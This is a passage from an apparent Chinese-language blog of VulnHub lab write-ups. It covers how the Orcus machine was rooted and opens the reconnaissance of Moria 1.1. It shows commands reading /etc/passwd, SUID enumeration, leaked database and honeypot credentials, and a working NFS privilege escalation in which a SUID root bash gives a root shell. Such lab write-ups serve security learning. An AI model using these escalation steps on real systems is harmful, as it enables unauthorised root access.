again.<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>sudo: 3 incorrect password attempts<br>www-data@Orcus:/$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:eb:ce:6d brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.143/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>看看网站目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Orcus:/var/www$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>9bd556e5c961356857d6d527a7973560-zen-cart-v1.5.4-12302014.zip<br>a0c4f0d176f87ceda9b9890af09ed644-Adem-master.zip<br>b873fef091715964d207daa19d320a99-zenphoto-zenphoto-1.4.10.tar.gz<br>flag.txt<br>html<br>zenphoto-zenphoto-1.4.10<br>www-data@Orcus:/var/www$ <span class="hljs-built_in">cat</span> flag.txt<br><span class="hljs-built_in">cat</span> flag.txt<br>868c889965b7ada547fae81f922e45c4<br>www-data@Orcus:/var/www$ <span class="hljs-built_in">cd</span> html<br><span class="hljs-built_in">cd</span> html<br>www-data@Orcus:/var/www/html$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span>: cannot open directory <span class="hljs-string">&#x27;.&#x27;</span>: Permission denied<br>www-data@Orcus:/var/www/html$ <span class="hljs-built_in">ls</span> <br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span>: cannot open directory <span class="hljs-string">&#x27;.&#x27;</span>: Permission denied<br>www-data@Orcus:/var/www/html$ <span class="hljs-built_in">cd</span> zenphoto<br><span class="hljs-built_in">cd</span> zenphoto<br>www-data@Orcus:/var/www/html/zenphoto$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>LICENSE    albums  cache_html       favicon.ico  plugins     themes    zp-core<br>README.md  cache   contributing.md  index.php    robots.txt  uploaded  zp-data<br></code></pre></td></tr></table></figure><p>发现了一个 flag.txt，但是html 目录的文件夹没有 x 权限我们无法获取到目录信息，去看看定时任务、用户家目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Orcus:/var$ <span class="hljs-built_in">ls</span> -alih /etc/passwd /etc/shadow /etc/crontab<br><span class="hljs-built_in">ls</span> -alih /etc/passwd /etc/shadow /etc/crontab<br>262378 -rw-r--r-- 1 root root    722 Feb  9  2013 /etc/crontab<br>265272 -rw-r--r-- 1 root root   2.2K Oct 28  2016 /etc/passwd<br>263179 -rw-r----- 1 root shadow 1.2K Oct 28  2016 /etc/shadow<br>www-data@Orcus:/var$ <span class="hljs-built_in">cat</span> /etc/passwd | grep <span class="hljs-string">&quot;/bin/bash&quot;</span><br><span class="hljs-built_in">cat</span> /etc/passwd | grep <span class="hljs-string">&quot;/bin/bash&quot;</span><br>root:x:0:0:root:/root:/bin/bash<br>postgres:x:110:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash<br>kippo:x:1001:27::/home/kippo:/bin/bash<br><br>www-data@Orcus:/var/backups$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br>www-data@Orcus:/var/www/html/zenphoto$ <span class="hljs-built_in">cd</span> /home<br><span class="hljs-built_in">cd</span> /home<br>www-data@Orcus:/home$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>www-data@Orcus:/home$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 12K<br>  12 drwxr-xr-x  3 root root 4.0K Nov  1  2016 .<br>   2 drwxr-xr-x 24 root root 4.0K Oct 30  2016 ..<br>8939 drwxr-xr-x  2 root root 4.0K Nov  1  2016 .youwillfindnothinghere<br>www-data@Orcus:/home$ <span class="hljs-built_in">cd</span> .youwillfindnothinghere<br><span class="hljs-built_in">cd</span> .youwillfindnothinghere<br>www-data@Orcus:/home/.youwillfindnothinghere$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 8.0K<br>8939 drwxr-xr-x 2 root root 4.0K Nov  1  2016 .<br>  12 drwxr-xr-x 3 root root 4.0K Nov  1  2016 ..<br>8940 -rw-r--r-- 1 root root    0 Nov  1  2016 itoldyou<br></code></pre></td></tr></table></figure><p>用户家目录空空如也，SUID 呢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Orcus:/var/www$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>    46465    388 -rwsr-xr--   1 root     dip        396068 Jan 29  2016 /usr/sbin/pppd<br>    26094     40 -rwsr-xr-x   1 root     root        39560 Mar 29  2016 /usr/bin/chsh<br>    20009     20 -rwsr-xr-x   1 root     root        18216 Jan 17  2016 /usr/bin/pkexec<br>    18795     36 -rwsr-xr-x   1 root     root        36288 Mar 29  2016 /usr/bin/newuidmap<br>    18793     36 -rwsr-xr-x   1 root     root        36288 Mar 29  2016 /usr/bin/newgidmap<br>    26095     48 -rwsr-xr-x   1 root     root        48264 Mar 29  2016 /usr/bin/chfn<br>    26091     52 -rwsr-xr-x   1 root     root        53128 Mar 29  2016 /usr/bin/passwd<br>    19523     52 -rwsr-sr-x   1 daemon   daemon      50748 Jan 14  2016 /usr/bin/at<br>    26097     80 -rwsr-xr-x   1 root     root        78012 Mar 29  2016 /usr/bin/gpasswd<br>     1518     36 -rwsr-xr-x   1 root     root        34680 Mar 29  2016 /usr/bin/newgrp<br>     4130    160 -rwsr-xr-x   1 root     root       159852 Aug 17  2016 /usr/bin/sudo<br>    18105     96 -rwsr-sr-x   1 root     mail        96192 May 15  2015 /usr/bin/procmail<br>   279472     12 -rwsr-xr-x   1 root     root         9760 Jul 26  2015 /usr/lib/authbind/helper<br>      536      8 -rwsr-xr-x   1 root     root         5480 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device<br>    19356    504 -rwsr-xr-x   1 root     root       513528 Aug 11  2016 /usr/lib/openssh/ssh-keysign<br>   131672     48 -rwsr-xr--   1 root     messagebus    46436 Apr  1  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   135108     16 -rwsr-xr-x   1 root     root          13960 Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1<br>    18834     52 -rwsr-xr-x   1 root     root          50540 Oct  6  2016 /usr/lib/snapd/snap-confine<br>    18771     40 -rwsr-xr-x   1 root     root          38300 Oct 21  2016 /usr/lib/i386-linux-gnu/lxc/lxc-user-nic<br>    26896     96 -rwsr-xr-x   1 root     root          96644 Apr  6  2016 /sbin/mount.nfs<br>    19990     40 -rwsr-xr-x   1 root     root          38660 Aug 21  2015 /sbin/mount.cifs<br>   132439     40 -rwsr-xr-x   1 root     root          38932 May  7  2014 /bin/ping<br>   131099     40 -rwsr-xr-x   1 root     root          38900 Mar 29  2016 /bin/su<br>   134208    156 -rwsr-xr-x   1 root     root         157424 Feb 17  2016 /bin/ntfs-3g<br>   131157     32 -rwsr-xr-x   1 root     root          30112 Jul 12  2016 /bin/fusermount<br>   133438     28 -rwsr-xr-x   1 root     root          26492 May 26  2016 /bin/umount<br>   133434     36 -rwsr-xr-x   1 root     root          34812 May 26  2016 /bin/mount<br>   131637     44 -rwsr-xr-x   1 root     root          43316 May  7  2014 /bin/ping6<br><br></code></pre></td></tr></table></figure><p>有几个不熟悉的查了一 d下（直接问 chatgpt），<code>/usr/lib/snapd/snap-confine</code> SUID 倒是存在提权 exp，但是由于某些文件夹的权限问题利用失败</p><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>尝试内核提权</p><p><img src="/pic/f80c4baf4cc27e0d98447a9ac5e0fc74_MD5.png"></p><p>还参考了 linpeas 的结果，图片中和 4.4.0 相关的 exp 都失败了。linpeas 中高可能性的 exp 也都失败。这里再次陷入迷茫。从头开始看 linpeas 吧。</p><p>linpeas 不知道在哪个 php 的配置文件中找到了又一个数据库用户名和密码</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$d</span>bpass=<span class="hljs-string">&#x27;sX6yATfXjVyf&#x27;</span>;                                                                                             <br><span class="hljs-symbol">$d</span>buser=<span class="hljs-string">&#x27;phpmyadmin&#x27;</span>;<br></code></pre></td></tr></table></figure><p>还发现了一个特殊的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/kippo/honeyfs/etc/passwd<br></code></pre></td></tr></table></figure><p>进入到 <code>/etc/kippo</code></p><p><img src="/pic/695773705a5864da1eb248c598e39b67_MD5.png"></p><p>竟然是个蜜罐</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">ww-data@Orcus:/etc/kippo$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>README.md  dl   fs.pickle  kippo      kippo.tac  start.sh  txtcmds<br>data       doc  honeyfs    kippo.cfg  <span class="hljs-built_in">log</span>        stop.sh   utils<br>www-data@Orcus:/etc/kippo$ <span class="hljs-built_in">cd</span> data<br><span class="hljs-built_in">cd</span> data<br>www-data@Orcus:/etc/kippo/data$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>userdb.txt<br>www-data@Orcus:/etc/kippo/data$ <span class="hljs-built_in">cat</span> userdb.txt<br><span class="hljs-built_in">cat</span> userdb.txt<br>root:0:123456<br>fakuser:1:TH!SP4SSW0RDIS4Fl4G!<br></code></pre></td></tr></table></figure><p>发现了蜜罐的用户名和密码，这竟然还是个 flag，尝试用这里的密码和之前收集到的数据库用户名的密码，尝试切换 root，但是失败了。</p><h3 id="NFS-提权"><a href="#NFS-提权" class="headerlink" title="NFS 提权"></a>NFS 提权</h3><p>检查 linpeas 的结果时忽略了一条高危，看了 WP 才想起来</p><p><img src="/pic/933b90b64ddd23707e2cbc372fe5827f_MD5.png"></p><p>问一下 chatgpt</p><p><img src="/pic/67540195dd188186f002e5f350e6d7bb_MD5.png"></p><p>红队笔记的提权精讲里也提到了这种提权方法 NFS 提权 [[..&#x2F;technique&#x2F;Privilege Escalation&#x2F;「红队笔记」Linux提权精讲|「红队笔记」Linux提权精讲]]</p><p>在 shell 中把 bash 文件直接复制到 tmp 文件夹，然后在挂载后的本地 bash 中修改文件属主和权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Orcus:/tmp$ <span class="hljs-built_in">cp</span> /bin/bash ./<br><span class="hljs-built_in">cp</span> /bin/bash ./<br>www-data@Orcus:/tmp$ <span class="hljs-built_in">ls</span> -alih ./bash                            <br><span class="hljs-built_in">ls</span> -alih ./bash                                                 <br>8247 -rwxr-xr-x 1 www-data www-data 1.1M Sep 21 13:17 ./bash<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp/tmp]<br>└─<span class="hljs-comment"># chown root:root bash </span><br><br>┌──(root㉿kali)-[/tmp/tmp]<br>└─<span class="hljs-comment"># chmod +s bash</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Orcus:/tmp$ <span class="hljs-built_in">ls</span> -alih ./bash<br><span class="hljs-built_in">ls</span> -alih ./bash <br>8247 -rwsr-sr-x 1 root root 1.1M Sep 21 13:17 ./bash<br>www-data@Orcus:/tmp$ ./bash -p<br>./bash -p<br>bash-4.3<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>bash-4.3<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-data)<br>bash-4.3<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>bash-4.3<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>flag.txt<br>bash-4.3<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:eb:ce:6d brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.143/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>bash-4.3<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux Orcus 4.4.0-45-generic <span class="hljs-comment">#66-Ubuntu SMP Wed Oct 19 14:12:05 UTC 2016 i686 athlon i686 GNU/Linux</span><br>bash-4.3<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>bash-4.3<span class="hljs-comment"># ls -liah</span><br><span class="hljs-built_in">ls</span> -liah<br>total 44K<br>    16 drwx------  6 root root 4.0K Mar 11  2017 .<br>     2 drwxr-xr-x 24 root root 4.0K Oct 30  2016 ..<br>    20 -rw-------  1 root root  118 Mar 11  2017 .bash_history<br>    17 -rw-r--r--  1 root root 3.1K Feb 19  2014 .bashrc<br>131267 drwx------  3 root root 4.0K Nov  1  2016 .cache<br>262316 drwx------  3 root root 4.0K Oct 11  2016 .config<br>134577 drwxr-xr-x  2 root root 4.0K Oct 28  2016 .nano<br>    18 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>131271 drwx------  2 root root 4.0K Oct 22  2016 .ssh<br>  8248 -rw-------  1 root root  657 Nov  1  2016 .viminfo<br>   863 ----------  1 root root   33 Oct 22  2016 flag.txt<br>bash-4.3<span class="hljs-comment"># cat flag.txt</span><br><span class="hljs-built_in">cat</span> flag.txt<br>807307b49314f822985d0410de7d8bfe<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Moria 1.1 靶机</title>
    <link href="/2023/09/ef22d903c06e.html"/>
    <url>/2023/09/ef22d903c06e.html</url>
    
    <content type="html"><![CDATA[<h1 id="Moria-1-1-靶机"><a href="#Moria-1-1-靶机" class="headerlink" title="Moria 1.1 靶机"></a>Moria 1.1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Moria 1.1]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.154<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-18 03:20 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.154<br>Host is up (0.00060s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:09:B3:87 (VMware)<br></code></pre></td></tr></table></figure><p>开放了21, 22, 80 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Moria 1.1]<br>└─$ sudo nmap -sT -sV -sC -O -p21,22,80 192.1.1.154<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-18 03:21 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.154<br>Host is up (0.00028s latency).<br><br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     vsftpd 2.0.8 or later<br>22/tcp open  ssh     OpenSSH 6.6.1 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 47:b5:ed:e3:f9:ad:96:88:c0:f2:83:23:7f:a3:d3:4f (RSA)<br>|   256 85:<span class="hljs-built_in">cd</span>:a2:d8:bb:85:f6:0f:4e:ae:8c:aa:73:52:ec:63 (ECDSA)<br>|_  256 b1:77:7e:08:b3:a0:84:f8:f4:5d:f9:8e:d5:85:b9:34 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/<span class="hljs-number">5.4</span>.<span class="hljs-number">16</span>)<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">6</span> (CentOS) PHP/<span class="hljs-number">5.4</span>.<span class="hljs-number">16</span><br>|_http-title: Gates of Moria<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">09</span>:B3:<span class="hljs-number">87</span> (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed port<br>Device type: general purpose<br>Running: Linux <span class="hljs-number">3</span>.X|<span class="hljs-number">4</span>.X<br>OS CPE: cpe:/o:linux:linux_kernel:<span class="hljs-number">3</span> cpe:/o:linux:linux_kernel:<span class="hljs-number">4</span><br>OS details: Linux <span class="hljs-number">3.2</span> - <span class="hljs-number">4.9</span><br>Network Distance: <span class="hljs-number">1</span> hop<br></code></pre></td></tr></table></figure><p>21 端口 vsftpd 2.0.8，Centos 系统，80 端口 Apache&#x2F;2.4.6 (CentOS) PHP&#x2F;5.4.16</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Moria 1.1]<br>└─$ sudo nmap --script=vuln -p21,22,80 192.1.1.154           <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-18 03:22 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.154<br>Host is up (0.00028s latency).<br><br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-trace: TRACE is enabled<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /w/: Potentially interesting folder w/ directory listing</span><br><span class="hljs-string">|_  /icons/: Potentially interesting folder w/ directory listing</span><br><span class="hljs-string">MAC Address: 00:0C:29:09:B3:87 (VMware)</span><br></code></pre></td></tr></table></figure><p>发现了 <code>/w/</code> 文件夹</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>试一试目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Moria 1.1]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.1.1.154/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,sql,tar,php<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.1.1.154/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              txt,html,sql,tar,php<br>[+] Timeout:                 10s<br>===============================================================<br>2023/09/18 03:25:39 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.php            (Status: 200) [Size: 85]<br>/.html                (Status: 403) [Size: 207]<br>/w                    (Status: 301) [Size: 229] [--&gt; http://192.1.1.154/w/]<br>/.html                (Status: 403) [Size: 207]<br>Progress: 1321206 / 1323366 (99.84%)<br>===============================================================<br>2023/09/18 03:27:46 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>除了 <code>/w</code> 没发现更有价值的目录，先看看 Web 界面吧</p><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>网站根目录是一张图片，网站标题是 <code>Gates of Moria</code>，图片名字是 <code>moria</code></p><p><img src="/pic/450e5868a24fd8cb1f7362f203945dd5_MD5.png"></p><p>直接谷歌搜索 <code>Gates of Moria</code></p><p><img src="/pic/61a5b87a6db229108d86318e4a36a3fa_MD5.png"></p><p>第一个链接中的故事背景简单梳理了一下，大意是这个门是有个密码的，甘道夫刚开始没想出密码是什么，对话时巧合之下，明白了密码是 Mellon，意为朋友。先记录下来 <code>Mellon</code></p><p><img src="/pic/c552f1f8ee03a18484cab712cb86712f_MD5.png"></p><p>是一个可以一直点击的目录，点到最后得到这样的内容</p><p><img src="/pic/34a7b39900975d07402899e8804d274f_MD5.png"></p><p>刷新了几次，发现每次都随机得到一段话，中间也会重复几次，收集了一下：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-string">&quot;Is this the end?&quot;</span> <br><span class="hljs-symbol">Nain:</span><span class="hljs-string">&quot;Will the human get the message?&quot;</span> <br><span 